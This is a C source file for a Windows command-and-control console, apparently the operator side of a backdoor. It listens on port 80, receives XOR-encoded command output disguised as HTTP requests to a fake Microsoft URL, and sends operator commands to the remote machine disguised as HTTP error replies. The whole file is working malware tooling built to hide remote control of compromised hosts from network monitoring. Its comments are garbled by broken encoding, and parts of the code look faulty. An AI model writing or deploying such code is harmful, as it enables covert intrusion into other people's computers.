#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define TKey	0x99

int main(void)
{
   	WSADATA              wsaData;
   	SOCKET               ListeningSocket;
   	SOCKET               NewConnection;
   	SOCKADDR_IN          ServerAddr;
   	SOCKADDR_IN          ClientAddr;
   	int                  ClientAddrLen;
   	int                  Port = 80;
   	int                  Ret;
	int		     i;
	char		     szSendBuf[0x500]={0};
	char		     szRecvBuf[0x500]={0};
	char		     szBuffer[0x500]={0};

	char		     szURLTitle[] = "GET http:////www.microsoft.com//updata//Search.aspx?displaylang=en&&upid=";					
	char		     szCmdTitle[]="<h1>Bad Request (Invalid Verb)<//h1>\n";

	int URLsize = strlen(szURLTitle);
	int CmdTitlesize = strlen(szCmdTitle);
	char *bptr, *tptr;
	
	printf("\t-=DevilLogic MasterMix 1.0.0=-\r\n");
	printf("<Author:logic.yan>.\r\n");
	printf("======================================================\r\n");
	if((Ret = WSAStartup(MAKEWORD(2,2), &wsaData)) != 0)	
	{
		printf("WSAStartup ����ʧ��. �������:<%d>\r\n", Ret);
		return;
	}/* end if */	

	/* �����׽��� */
   	if ((ListeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) 
       		== INVALID_SOCKET)
   	{
      		printf("socket �׽��ִ���ʧ��. �������:<%d>\n", WSAGetLastError());
      		WSACleanup();
      		return;
   	}/* end if */
 
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_port = htons(Port);
	ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	
   	if (bind(ListeningSocket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr)) 
       		== SOCKET_ERROR)
   	{
      		printf("bind ��ʧ��. �������:<%d>\n", WSAGetLastError());
      		closesocket(ListeningSocket);
      		WSACleanup();
      		return;
   	}/* end if */
	
   	if (listen(ListeningSocket, 5) == SOCKET_ERROR)
   	{
      		printf("listen ����ʧ��. �������:<%d>\n", WSAGetLastError());
      		closesocket(ListeningSocket);
      		WSACleanup();
      		return;
   	}/* end if */

   	printf("�ڶ˿� <%d> �ȴ�����.\n", Port);	
	
   	if ((NewConnection = accept(ListeningSocket, (SOCKADDR *) &ClientAddr,
                               &ClientAddrLen)) == INVALID_SOCKET)
   	{
      		printf("accept ����ʧ��. �������:<%d>\n", WSAGetLastError());
      		closesocket(ListeningSocket);
      		WSACleanup();
      		return;
   	}/* end if */
	
   	printf("�ɹ���ȡһ�����Ӵ� %s:%d.\n",
          	inet_ntoa(ClientAddr.sin_addr), ntohs(ClientAddr.sin_port));
	
	/* ��ʼ�������� */
	while(1)
	{	/* �����µĵ�ǰĿ¼�� */
		memset(szSendBuf, 0, 0x500);
		memset(szRecvBuf, 0, 0x500);
		memset(szBuffer, 0, 0x500);
   		if ((Ret = recv(NewConnection, szRecvBuf, sizeof(szRecvBuf), 0)) 
       			== SOCKET_ERROR)
   		{
      			printf("recv ��������ʧ��. �������:<%d>\n", WSAGetLastError());
      			closesocket(NewConnection);
      			WSACleanup();
      			return;
   		}/* end if */
		/* �������� */		
		bptr = szRecvBuf + URLsize;
		Ret = Ret - URLsize;
		for(i=0;i<Ret;i++)
		{
			szBuffer[i] = *(bptr+i) ^ TKey;
		}/* end for */
		/* ��ʾ��ǰ·�� */
		printf("%s", szBuffer);
		/* �������� */
		memset(szBuffer, 0, 0x500);
		scanf("%s", szBuffer);
		Ret = strlen(szBuffer);	/* ����ĳ��� */
		/* �������ͻ��� */
		strcpy(szSendBuf, szCmdTitle);
		strcat(szSendBuf, szBuffer);
		bptr = szSendBuf + CmdTitlesize;
		tptr = bptr;
		/* �������� */
		for(i=0;i<Ret;i++)
		{
			*(tptr+i) = *(bptr+i) ^ TKey;
		}/* end for */
		/* �������� */
		i = strlen(szSendBuf);		/* iΪ���ͳ��� */
   		if ((Ret = send(NewConnection, szBuffer, i, 0)) == SOCKET_ERROR)
   		{
      			printf("send ��������ʧ��. �������:<%d>\n", WSAGetLastError());
      			closesocket(NewConnection);
      			WSACleanup();
      			return;
   		}/* end if */
		/* ����ִ������ؽ�� */
		memset(szBuffer, 0, 0x500);
		memset(szRecvBuf, 0, 0x500);
   		if ((Ret = recv(NewConnection, szRecvBuf, sizeof(szRecvBuf), 0)) 
       			== SOCKET_ERROR)
   		{
      			printf("recv ��������ʧ��. �������:<%d>\n", WSAGetLastError());
      			closesocket(NewConnection);
      			WSACleanup();
      			return;
   		}/* end if */
		/* �������� */		
		bptr = szRecvBuf + URLsize;
		Ret = Ret - URLsize;
		for(i=0;i<Ret;i++)
		{
			szBuffer[i] = *(bptr+i) ^ TKey;
		}/* end for */
		/* ��ʾ��ǰ·�� */
		printf("%s\r\n", szBuffer);				
	}/* end while */
     	closesocket(ListeningSocket);
     	closesocket(NewConnection);
      	WSACleanup();
	return 0;		
}/* end main */





















